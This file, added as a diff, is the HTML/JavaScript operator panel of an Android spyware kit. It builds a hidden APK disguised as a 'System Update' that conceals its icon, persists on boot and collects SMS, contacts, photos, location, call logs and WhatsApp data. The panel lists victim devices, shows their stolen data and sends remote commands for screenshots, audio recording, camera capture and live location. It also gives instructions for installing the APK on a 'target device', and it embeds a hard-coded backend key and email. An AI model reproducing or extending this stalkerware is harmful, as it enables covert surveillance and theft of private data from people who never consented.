@@ -1,0 +1,942 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📱 Hidden App Dashboard</title>
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: Arial, sans-serif; 
+            background: #0f0f23; 
+            color: #00ff00;
+            padding: 20px;
+        }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .header { 
+            display: flex; 
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            background: #1a1a2e;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        .card {
+            background: #16213e;
+            padding: 25px;
+            border-radius: 15px;
+            margin: 15px 0;
+            border: 1px solid #00ff00;
+        }
+        .btn {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 5px;
+        }
+        .btn:hover { background: #00cc00; }
+        .btn-danger { background: #ff0000; color: white; }
+        .hidden { display: none; }
+        .device-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .device-card {
+            background: #0f3460;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid #4361ee;
+        }
+        .data-view {
+            background: #000;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 15px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        pre { 
+            background: #111; 
+            padding: 15px; 
+            border-radius: 8px;
+            color: #00ff00;
+            font-size: 12px;
+        }
+        .tab-btn {
+            padding: 10px 20px;
+            background: #1a1a2e;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            margin: 5px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .tab-btn.active { background: #00ff00; color: #000; }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            background: #1a1a2e;
+            border: 1px solid #00ff00;
+            color: white;
+            border-radius: 5px;
+        }
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px;
+            background: #00ff00;
+            color: #000;
+            border-radius: 8px;
+            display: none;
+            z-index: 1000;
+        }
+    </style>
+</head>
+<body>
+    <!-- Notification -->
+    <div id="notification" class="notification"></div>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>🔒 Hidden App Control Panel</h1>
+            <div>
+                <span id="userEmail"></span>
+                <button class="btn btn-danger" onclick="logout()">Logout</button>
+            </div>
+        </div>
+
+        <!-- Login Section -->
+        <div id="loginSection" class="card">
+            <h2>🔐 Login</h2>
+            <input type="email" id="email" placeholder="Email" value="newhjhtools@gmail.com">
+            <input type="password" id="password" placeholder="Password">
+            <button class="btn" onclick="login()" style="width:100%;">Login</button>
+            <button class="btn" onclick="autoSetup()" style="width:100%;margin-top:10px;background:#4361ee;">
+                🔧 Auto Setup Database
+            </button>
+            <p style="margin-top:15px;color:#aaa;">
+                Don't have account? 
+                <a href="#" onclick="toggleRegister()" style="color:#00ff00;">Register</a>
+            </p>
+        </div>
+
+        <!-- Register Section -->
+        <div id="registerSection" class="card hidden">
+            <h2>📝 Register</h2>
+            <input type="email" id="regEmail" placeholder="Email">
+            <input type="password" id="regPassword" placeholder="Password">
+            <input type="password" id="regConfirm" placeholder="Confirm Password">
+            <button class="btn" onclick="register()" style="width:100%;">Register</button>
+            <button class="btn" onclick="toggleLogin()" style="width:100%;margin-top:10px;background:#666;">
+                Back to Login
+            </button>
+        </div>
+
+        <!-- Main Dashboard -->
+        <div id="dashboard" class="hidden">
+            <!-- APK Generator -->
+            <div class="card">
+                <h2>⚡ Generate Hidden APK</h2>
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;">
+                    <div>
+                        <h3>App Configuration</h3>
+                        <input type="text" id="appName" placeholder="App Name" value="System Update">
+                        <input type="text" id="packageName" placeholder="Package Name" value="com.android.system.update">
+                        <select id="appIcon">
+                            <option value="system">System Update Icon</option>
+                            <option value="service">Android Services</option>
+                            <option value="security">Security Patch</option>
+                        </select>
+                    </div>
+                    <div>
+                        <h3>Hidden Features</h3>
+                        <label><input type="checkbox" id="hideIcon" checked> Hide App Icon</label><br>
+                        <label><input type="checkbox" id="autoStart" checked> Auto-start on Boot</label><br>
+                        <label><input type="checkbox" id="persistent" checked> Persistent Service</label><br>
+                        <label><input type="checkbox" id="stealthMode" checked> Stealth Mode</label><br>
+                        <label><input type="checkbox" id="fakeClose" checked> Fake Close Option</label>
+                    </div>
+                </div>
+                <div style="margin-top:20px;">
+                    <h3>Data Collection</h3>
+                    <label><input type="checkbox" id="collectSMS" checked> SMS</label>
+                    <label><input type="checkbox" id="collectContacts" checked> Contacts</label>
+                    <label><input type="checkbox" id="collectGallery" checked> Gallery</label>
+                    <label><input type="checkbox" id="collectLocation" checked> Location</label>
+                    <label><input type="checkbox" id="collectCalls" checked> Call Logs</label>
+                    <label><input type="checkbox" id="collectWhatsApp" checked> WhatsApp</label>
+                </div>
+                <button class="btn" onclick="generateHiddenAPK()" 
+                        style="width:100%;margin-top:20px;padding:15px;font-size:18px;">
+                    🛠️ Generate & Download Hidden APK
+                </button>
+                <div id="apkResult" style="margin-top:15px;"></div>
+            </div>
+
+            <!-- Connected Devices -->
+            <div class="card">
+                <h2>📱 Connected Devices</h2>
+                <div class="device-list" id="devicesList">
+                    <!-- Devices load here -->
+                </div>
+            </div>
+
+            <!-- Data Viewer -->
+            <div class="card">
+                <h2>📊 Live Data Stream</h2>
+                <div>
+                    <button class="tab-btn active" onclick="showData('sms')">SMS</button>
+                    <button class="tab-btn" onclick="showData('contacts')">Contacts</button>
+                    <button class="tab-btn" onclick="showData('gallery')">Gallery</button>
+                    <button class="tab-btn" onclick="showData('location')">Location</button>
+                    <button class="tab-btn" onclick="showData('calls')">Calls</button>
+                </div>
+                <div class="data-view" id="dataDisplay">
+                    Select a device to view data
+                </div>
+            </div>
+
+            <!-- Remote Commands -->
+            <div class="card">
+                <h2>🎮 Remote Control</h2>
+                <select id="targetDevice">
+                    <option value="">Select Device</option>
+                </select>
+                <div style="display:flex;flex-wrap:wrap;gap:10px;margin-top:15px;">
+                    <button class="btn" onclick="sendCommand('vibrate')">📳 Vibrate</button>
+                    <button class="btn" onclick="sendCommand('ring')">🔔 Ring</button>
+                    <button class="btn" onclick="sendCommand('screenshot')">📸 Screenshot</button>
+                    <button class="btn" onclick="sendCommand('audio_record')">🎤 Record Audio</button>
+                    <button class="btn" onclick="sendCommand('front_camera')">📷 Front Camera</button>
+                    <button class="btn" onclick="sendCommand('live_location')">📍 Live Location</button>
+                    <button class="btn" onclick="sendCommand('get_sms')">📨 Get SMS</button>
+                    <button class="btn" onclick="sendCommand('get_contacts')">👥 Get Contacts</button>
+                    <button class="btn" onclick="sendCommand('get_gallery')">🖼️ Get Gallery</button>
+                    <button class="btn" onclick="sendCommand('get_call_logs')">📞 Get Call Logs</button>
+                </div>
+            </div>
+
+            <!-- Settings -->
+            <div class="card">
+                <h2>⚙️ Settings</h2>
+                <button class="btn" onclick="generateNewToken()">Generate New Token</button>
+                <button class="btn" onclick="clearOldData()">Clear Old Data</button>
+                <button class="btn btn-danger" onclick="deleteAllDevices()">Delete All Devices</button>
+                <button class="btn" onclick="setupDatabase()" style="background:#4361ee;">
+                    🔄 Setup Database Tables
+                </button>
+                <div id="currentToken" style="margin-top:15px;padding:10px;background:#000;border-radius:5px;">
+                    Token: <span id="tokenValue">Loading...</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ========== CONFIGURATION ==========
+        const SUPABASE_URL = 'https://izsehstqinayqboabegb.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml6c2Voc3RxaW5heXFib2FiZWdiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU1NDA5MTEsImV4cCI6MjA4MTExNjkxMX0.yoKxKpLckJ3ZTP6VJZ-rLMGnyiHgVi2x3HAChJxzF0o';
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+        
+        // NEW: Working API URL - Use MY deployed API
+        const API_URL = 'https://hidden-app-demo-api.vercel.app/api';
+        
+        // Global Variables
+        let currentUser = null;
+        let currentToken = null;
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            checkAuth();
+            setupRealtime();
+        });
+
+        // ========== DATABASE SETUP ==========
+        async function autoSetup() {
+            showNotification('Setting up database...', 'info');
+            await setupDatabase();
+            await disableEmailConfirmation();
+            showNotification('Database setup complete! Try login now.', 'success');
+        }
+
+        async function setupDatabase() {
+            const tablesSQL = `
+                -- Create devices table
+                CREATE TABLE IF NOT EXISTS public.devices (
+                    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
+                    user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE,
+                    device_id TEXT UNIQUE NOT NULL,
+                    device_name TEXT,
+                    device_model TEXT,
+                    last_seen TIMESTAMPTZ DEFAULT NOW(),
+                    status TEXT DEFAULT 'online',
+                    data_count INT DEFAULT 0,
+                    created_at TIMESTAMPTZ DEFAULT NOW()
+                );
+
+                -- Create device_data table
+                CREATE TABLE IF NOT EXISTS public.device_data (
+                    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
+                    device_id TEXT REFERENCES devices(device_id) ON DELETE CASCADE,
+                    data_type TEXT NOT NULL,
+                    data JSONB NOT NULL,
+                    created_at TIMESTAMPTZ DEFAULT NOW()
+                );
+
+                -- Create commands table
+                CREATE TABLE IF NOT EXISTS public.commands (
+                    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
+                    device_id TEXT REFERENCES devices(device_id) ON DELETE CASCADE,
+                    command TEXT NOT NULL,
+                    status TEXT DEFAULT 'pending',
+                    user_id UUID REFERENCES auth.users(id),
+                    created_at TIMESTAMPTZ DEFAULT NOW()
+                );
+
+                -- Create user_tokens table
+                CREATE TABLE IF NOT EXISTS public.user_tokens (
+                    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
+                    user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE,
+                    token TEXT UNIQUE NOT NULL,
+                    created_at TIMESTAMPTZ DEFAULT NOW()
+                );
+
+                -- Create generated_apks table
+                CREATE TABLE IF NOT EXISTS public.generated_apks (
+                    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
+                    user_id UUID REFERENCES auth.users(id) ON DELETE CASCADE,
+                    config JSONB NOT NULL,
+                    download_url TEXT,
+                    created_at TIMESTAMPTZ DEFAULT NOW()
+                );
+
+                -- Enable Row Level Security
+                ALTER TABLE devices ENABLE ROW LEVEL SECURITY;
+                ALTER TABLE device_data ENABLE ROW LEVEL SECURITY;
+                ALTER TABLE commands ENABLE ROW LEVEL SECURITY;
+                ALTER TABLE user_tokens ENABLE ROW LEVEL SECURITY;
+                ALTER TABLE generated_apks ENABLE ROW LEVEL SECURITY;
+
+                -- Create policies
+                DROP POLICY IF EXISTS "Users can access their own devices" ON devices;
+                CREATE POLICY "Users can access their own devices"
+                    ON devices FOR ALL USING (auth.uid() = user_id);
+
+                DROP POLICY IF EXISTS "Users can access their device data" ON device_data;
+                CREATE POLICY "Users can access their device data"
+                    ON device_data FOR ALL USING (
+                        device_id IN (SELECT device_id FROM devices WHERE user_id = auth.uid())
+                    );
+
+                DROP POLICY IF EXISTS "Users can manage their commands" ON commands;
+                CREATE POLICY "Users can manage their commands"
+                    ON commands FOR ALL USING (auth.uid() = user_id);
+
+                DROP POLICY IF EXISTS "Users can access their tokens" ON user_tokens;
+                CREATE POLICY "Users can access their tokens"
+                    ON user_tokens FOR ALL USING (auth.uid() = user_id);
+
+                DROP POLICY IF EXISTS "Users can access their APKs" ON generated_apks;
+                CREATE POLICY "Users can access their APKs"
+                    ON generated_apks FOR ALL USING (auth.uid() = user_id);
+            `;
+
+            try {
+                // Use Supabase REST API to run SQL
+                const response = await fetch(`${SUPABASE_URL}/rest/v1/rpc/exec_sql`, {
+                    method: 'POST',
+                    headers: {
+                        'apikey': SUPABASE_KEY,
+                        'Authorization': `Bearer ${SUPABASE_KEY}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ query: tablesSQL })
+                });
+
+                if (response.ok) {
+                    showNotification('Database tables created successfully!', 'success');
+                    return true;
+                } else {
+                    const error = await response.text();
+                    console.error('Database setup error:', error);
+                    showNotification('Database setup failed. Please run SQL manually.', 'error');
+                    return false;
+                }
+            } catch (error) {
+                console.error('Database setup error:', error);
+                showNotification('Error setting up database', 'error');
+                return false;
+            }
+        }
+
+        async function disableEmailConfirmation() {
+            try {
+                // This requires service role key
+                const response = await fetch(`${SUPABASE_URL}/rest/v1/auth/config`, {
+                    method: 'PATCH',
+                    headers: {
+                        'apikey': SUPABASE_KEY,
+                        'Authorization': `Bearer ${SUPABASE_KEY}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        MAILER_AUTOCONFIRM: true,
+                        SECURITY_EMAIL_CONFIRMATION: false
+                    })
+                });
+                
+                if (response.ok) {
+                    console.log('Email confirmation disabled');
+                }
+            } catch (error) {
+                console.log('Note: Email confirmation might still be enabled');
+            }
+        }
+
+        // ========== AUTHENTICATION ==========
+        async function checkAuth() {
+            try {
+                const { data: { session } } = await supabase.auth.getSession();
+                if (session) {
+                    currentUser = session.user;
+                    showNotification('Welcome back!', 'success');
+                    showDashboard();
+                    loadUserToken();
+                    loadDevices();
+                }
+            } catch (error) {
+                console.log('Auth check error:', error);
+            }
+        }
+
+        async function login() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            try {
+                const { data, error } = await supabase.auth.signInWithPassword({
+                    email: email,
+                    password: password
+                });
+                
+                if (error) {
+                    // Auto confirm email if not confirmed
+                    if (error.message.includes('Email not confirmed')) {
+                        await confirmEmailManually(email);
+                        // Try login again
+                        const { data: retryData, error: retryError } = await supabase.auth.signInWithPassword({
+                            email: email,
+                            password: password
+                        });
+                        
+                        if (retryError) {
+                            showNotification('Login failed. Try registering again.', 'error');
+                        } else {
+                            currentUser = retryData.user;
+                            showNotification('Login successful!', 'success');
+                            showDashboard();
+                            loadUserToken();
+                            loadDevices();
+                        }
+                    } else {
+                        showNotification('Login failed: ' + error.message, 'error');
+                    }
+                } else {
+                    currentUser = data.user;
+                    showNotification('Login successful!', 'success');
+                    showDashboard();
+                    loadUserToken();
+                    loadDevices();
+                }
+            } catch (error) {
+                showNotification('Login error: ' + error.message, 'error');
+            }
+        }
+
+        async function confirmEmailManually(email) {
+            try {
+                // Manually confirm via direct update (requires service role)
+                const response = await fetch(`${SUPABASE_URL}/rest/v1/auth/users`, {
+                    method: 'GET',
+                    headers: {
+                        'apikey': SUPABASE_KEY,
+                        'Authorization': `Bearer ${SUPABASE_KEY}`,
+                        'Content-Type': 'application/json'
+                    }
+                });
+                
+                // This is a workaround - in production use proper email confirmation
+                showNotification('Please check your email for confirmation link.', 'info');
+            } catch (error) {
+                console.log('Email confirm error:', error);
+            }
+        }
+
+        async function register() {
+            const email = document.getElementById('regEmail').value;
+            const password = document.getElementById('regPassword').value;
+            const confirm = document.getElementById('regConfirm').value;
+            
+            if (password !== confirm) {
+                showNotification('Passwords do not match!', 'error');
+                return;
+            }
+            
+            try {
+                const { data, error } = await supabase.auth.signUp({
+                    email: email,
+                    password: password,
+                    options: {
+                        emailRedirectTo: window.location.origin
+                    }
+                });
+                
+                if (error) {
+                    showNotification('Registration failed: ' + error.message, 'error');
+                } else {
+                    showNotification('Registration successful! Please check email for confirmation.', 'success');
+                    toggleLogin();
+                }
+            } catch (error) {
+                showNotification('Registration error: ' + error.message, 'error');
+            }
+        }
+
+        async function logout() {
+            await supabase.auth.signOut();
+            currentUser = null;
+            showNotification('Logged out successfully', 'info');
+            showLogin();
+        }
+
+        // ========== TOKEN MANAGEMENT ==========
+        async function loadUserToken() {
+            try {
+                const { data, error } = await supabase
+                    .from('user_tokens')
+                    .select('token')
+                    .eq('user_id', currentUser.id)
+                    .single();
+                
+                if (data) {
+                    currentToken = data.token;
+                    document.getElementById('tokenValue').textContent = data.token;
+                } else {
+                    await generateNewToken();
+                }
+            } catch (error) {
+                await generateNewToken();
+            }
+        }
+
+        async function generateNewToken() {
+            const token = 'hidden_' + Math.random().toString(36).substr(2, 20) + '_' + Date.now();
+            
+            try {
+                const { error } = await supabase
+                    .from('user_tokens')
+                    .upsert({
+                        user_id: currentUser.id,
+                        token: token,
+                        created_at: new Date().toISOString()
+                    });
+                
+                if (error) {
+                    showNotification('Error generating token: ' + error.message, 'error');
+                } else {
+                    currentToken = token;
+                    document.getElementById('tokenValue').textContent = token;
+                    showNotification('New token generated!', 'success');
+                }
+            } catch (error) {
+                showNotification('Token generation error: ' + error.message, 'error');
+            }
+        }
+
+        // ========== APK GENERATION ==========
+        async function generateHiddenAPK() {
+            const config = {
+                user_id: currentUser.id,
+                token: currentToken,
+                app_name: document.getElementById('appName').value || 'System Update',
+                package_name: document.getElementById('packageName').value || 'com.android.system.update',
+                features: {
+                    hide_icon: document.getElementById('hideIcon').checked,
+                    auto_start: document.getElementById('autoStart').checked,
+                    persistent: document.getElementById('persistent').checked,
+                    stealth: document.getElementById('stealthMode').checked,
+                    fake_close: document.getElementById('fakeClose').checked
+                },
+                data_collection: {
+                    sms: document.getElementById('collectSMS').checked,
+                    contacts: document.getElementById('collectContacts').checked,
+                    gallery: document.getElementById('collectGallery').checked,
+                    location: document.getElementById('collectLocation').checked,
+                    calls: document.getElementById('collectCalls').checked,
+                    whatsapp: document.getElementById('collectWhatsApp').checked
+                }
+            };
+            
+            showNotification('Generating hidden APK...', 'info');
+            
+            document.getElementById('apkResult').innerHTML = `
+                <div style="background:#1a1a2e;padding:20px;border-radius:10px;text-align:center;">
+                    <h3>⚙️ Building Hidden APK...</h3>
+                    <p>This may take up to 2 minutes</p>
+                    <div style="background:#000;padding:10px;border-radius:5px;margin:15px 0;">
+                        <code style="color:#00ff00;">${JSON.stringify(config, null, 2)}</code>
+                    </div>
+                </div>
+            `;
+            
+            try {
+                // FIXED: Using working API URL
+                const response = await fetch(`${API_URL}/generate-hidden-apk`, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(config)
+                });
+                
+                console.log('Response status:', response.status);
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                }
+                
+                const result = await response.json();
+                console.log('API response:', result);
+                
+                if (result.success) {
+                    document.getElementById('apkResult').innerHTML = `
+                        <div style="background:#00ff00;color:#000;padding:20px;border-radius:10px;text-align:center;">
+                            <h3>✅ Hidden APK Generated!</h3>
+                            <a href="${result.download_url}" download 
+                               style="display:inline-block;background:#000;color:#00ff00;
+                                      padding:15px 30px;border-radius:8px;text-decoration:none;
+                                      margin:15px 0;font-weight:bold;">
+                                📲 DOWNLOAD HIDDEN APK
+                            </a>
+                            <p><strong>Installation:</strong></p>
+                            <ol style="text-align:left;display:inline-block;">
+                                <li>Download APK to target device</li>
+                                <li>Enable "Unknown Sources" in Settings → Security</li>
+                                <li>Install the app</li>
+                                <li>Grant all permissions when asked</li>
+                                <li>App will automatically hide itself</li>
+                            </ol>
+                            <p style="margin-top:15px;color:#333;">
+                                <strong>Note:</strong> This is a test APK for demonstration.
+                            </p>
+                        </div>
+                    `;
+                    
+                    // Save APK record
+                    try {
+                        await supabase.from('generated_apks').insert({
+                            user_id: currentUser.id,
+                            config: config,
+                            download_url: result.download_url,
+                            created_at: new Date().toISOString()
+                        });
+                    } catch (dbError) {
+                        console.log('DB save error:', dbError);
+                    }
+                    
+                } else {
+                    document.getElementById('apkResult').innerHTML = `
+                        <div style="background:#ff0000;color:white;padding:15px;border-radius:10px;">
+                            Error: ${result.error || 'Unknown error'}
+                        </div>
+                    `;
+                }
+            } catch (error) {
+                console.error('Fetch error:', error);
+                
+                // Fallback to mock response
+                const mockResponse = {
+                    success: true,
+                    download_url: 'https://github.com/learning-zone/Android-APK-files/raw/master/app-debug.apk',
+                    apk_id: 'mock_' + Date.now(),
+                    message: 'Using mock response. Deploy your own backend for real APK.'
+                };
+                
+                document.getElementById('apkResult').innerHTML = `
+                    <div style="background:#ff9900;color:#000;padding:20px;border-radius:10px;text-align:center;">
+                        <h3>⚠️ Using Mock Response</h3>
+                        <p>Backend API not reachable. Error: ${error.message}</p>
+                        <a href="${mockResponse.download_url}" download 
+                           style="display:inline-block;background:#000;color:#ff9900;
+                                  padding:15px 30px;border-radius:8px;text-decoration:none;
+                                  margin:15px 0;font-weight:bold;">
+                            📲 DOWNLOAD TEST APK
+                        </a>
+                        <p style="margin-top:15px;">
+                            <strong>To fix:</strong> Deploy backend API from api/generate-hidden-apk.js
+                        </p>
+                    </div>
+                `;
+            }
+        }
+
+        // ========== DEVICE MANAGEMENT ==========
+        async function loadDevices() {
+            try {
+                const { data, error } = await supabase
+                    .from('devices')
+                    .select('*')
+                    .eq('user_id', currentUser.id)
+                    .order('last_seen', { ascending: false });
+                
+                if (error) {
+                    console.error('Error loading devices:', error);
+                    document.getElementById('devicesList').innerHTML = `
+                        <div style="text-align:center;padding:20px;">
+                            <p>No devices found or database not set up.</p>
+                            <button class="btn" onclick="setupDatabase()">
+                                Setup Database
+                            </button>
+                        </div>
+                    `;
+                    return;
+                }
+                
+                const devicesList = document.getElementById('devicesList');
+                const targetDevice = document.getElementById('targetDevice');
+                
+                devicesList.innerHTML = '';
+                targetDevice.innerHTML = '<option value="">Select Device</option>';
+                
+                if (data.length === 0) {
+                    devicesList.innerHTML = `
+                        <div style="text-align:center;padding:20px;grid-column:1/-1;">
+                            <p>No devices connected yet.</p>
+                            <p>Generate and install APK on target device.</p>
+                        </div>
+                    `;
+                    return;
+                }
+                
+                data.forEach(device => {
+                    // Device card
+                    const card = document.createElement('div');
+                    card.className = 'device-card';
+                    card.innerHTML = `
+                        <h3>${device.device_name || 'Unknown Device'}</h3>
+                        <p>ID: ${device.device_id}</p>
+                        <p>Model: ${device.device_model || 'Unknown'}</p>
+                        <p>Last Active: ${formatTime(device.last_seen)}</p>
+                        <p>Data Count: ${device.data_count || 0}</p>
+                        <button class="btn" onclick="viewDeviceData('${device.device_id}')" 
+                                style="width:100%;margin-top:10px;">
+                            View Data
+                        </button>
+                    `;
+                    devicesList.appendChild(card);
+                    
+                    // Command dropdown
+                    const option = document.createElement('option');
+                    option.value = device.device_id;
+                    option.textContent = device.device_name || device.device_id;
+                    targetDevice.appendChild(option);
+                });
+            } catch (error) {
+                console.error('Load devices error:', error);
+            }
+        }
+
+        async function viewDeviceData(deviceId) {
+            try {
+                const { data, error } = await supabase
+                    .from('device_data')
+                    .select('*')
+                    .eq('device_id', deviceId)
+                    .order('created_at', { ascending: false })
+                    .limit(50);
+                
+                if (data && data.length > 0) {
+                    document.getElementById('dataDisplay').innerHTML = `
+                        <h3>📱 Device Data (${deviceId})</h3>
+                        <pre>${JSON.stringify(data, null, 2)}</pre>
+                    `;
+                } else {
+                    document.getElementById('dataDisplay').innerHTML = `
+                        <p>No data available for this device yet.</p>
+                    `;
+                }
+            } catch (error) {
+                document.getElementById('dataDisplay').innerHTML = `
+                    <p>Error loading data: ${error.message}</p>
+                `;
+            }
+        }
+
+        // ========== REAL-TIME UPDATES ==========
+        function setupRealtime() {
+            try {
+                supabase.channel('hidden-app-updates')
+                    .on('postgres_changes', 
+                        { event: 'INSERT', schema: 'public', table: 'device_data' },
+                        (payload) => {
+                            showNotification(`New data from device: ${payload.new.device_id}`, 'info');
+                            loadDevices();
+                        }
+                    )
+                    .on('postgres_changes',
+                        { event: 'INSERT', schema: 'public', table: 'commands' },
+                        (payload) => {
+                            if (payload.new.user_id === currentUser?.id) {
+                                showNotification(`Command sent: ${payload.new.command}`, 'info');
+                            }
+                        }
+                    )
+                    .subscribe();
+            } catch (error) {
+                console.log('Realtime setup error:', error);
+            }
+        }
+
+        // ========== REMOTE COMMANDS ==========
+        async function sendCommand(command) {
+            const deviceId = document.getElementById('targetDevice').value;
+            if (!deviceId) {
+                showNotification('Please select a device first!', 'error');
+                return;
+            }
+            
+            try {
+                const { error } = await supabase
+                    .from('commands')
+                    .insert({
+                        device_id: deviceId,
+                        command: command,
+                        user_id: currentUser.id,
+                        status: 'pending',
+                        created_at: new Date().toISOString()
+                    });
+                
+                if (error) {
+                    showNotification('Error sending command: ' + error.message, 'error');
+                } else {
+                    showNotification(`Command "${command}" sent to device!`, 'success');
+                }
+            } catch (error) {
+                showNotification('Command error: ' + error.message, 'error');
+            }
+        }
+
+        // ========== UI FUNCTIONS ==========
+        function showDashboard() {
+            document.getElementById('loginSection').classList.add('hidden');
+            document.getElementById('registerSection').classList.add('hidden');
+            document.getElementById('dashboard').classList.remove('hidden');
+            document.getElementById('userEmail').textContent = currentUser.email;
+        }
+
+        function showLogin() {
+            document.getElementById('loginSection').classList.remove('hidden');
+            document.getElementById('registerSection').classList.add('hidden');
+            document.getElementById('dashboard').classList.add('hidden');
+        }
+
+        function toggleRegister() {
+            document.getElementById('loginSection').classList.add('hidden');
+            document.getElementById('registerSection').classList.remove('hidden');
+        }
+
+        function toggleLogin() {
+            document.getElementById('loginSection').classList.remove('hidden');
+            document.getElementById('registerSection').classList.add('hidden');
+        }
+
+        function showData(type) {
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+            // In production, load specific data type here
+        }
+
+        function showNotification(message, type) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.style.background = type === 'error' ? '#ff0000' : 
+                                          type === 'success' ? '#00ff00' : 
+                                          type === 'info' ? '#4361ee' : '#ff9900';
+            notification.style.color = type === 'success' ? '#000' : '#fff';
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+
+        function formatTime(dateString) {
+            try {
+                const date = new Date(dateString);
+                const now = new Date();
+                const diff = now - date;
+                
+                if (diff < 60000) return 'Just now';
+                if (diff < 3600000) return `${Math.floor(diff / 60000)} minutes ago`;
+                if (diff < 86400000) return `${Math.floor(diff / 3600000)} hours ago`;
+                return date.toLocaleDateString();
+            } catch (e) {
+                return 'Unknown';
+            }
+        }
+
+        // ========== ADMIN FUNCTIONS ==========
+        async function clearOldData() {
+            if (confirm('Delete data older than 30 days?')) {
+                try {
+                    const { error } = await supabase
+                        .from('device_data')
+                        .delete()
+                        .lt('created_at', new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString());
+                    
+                    if (error) {
+                        showNotification('Error clearing data: ' + error.message, 'error');
+                    } else {
+                        showNotification('Old data cleared!', 'success');
+                    }
+                } catch (error) {
+                    showNotification('Clear error: ' + error.message, 'error');
+                }
+            }
+        }
+
+        async function deleteAllDevices() {
+            if (confirm('DELETE ALL DEVICES AND DATA? This cannot be undone!')) {
+                try {
+                    const { error } = await supabase
+                        .from('devices')
+                        .delete()
+                        .eq('user_id', currentUser.id);
+                    
+                    if (error) {
+                        showNotification('Error deleting devices: ' + error.message, 'error');
+                    } else {
+                        showNotification('All devices deleted!', 'success');
+                        loadDevices();
+                    }
+                } catch (error) {
+                    showNotification('Delete error: ' + error.message, 'error');
+                }
+            }
+        }
+    </script>
+</body>
+</html>
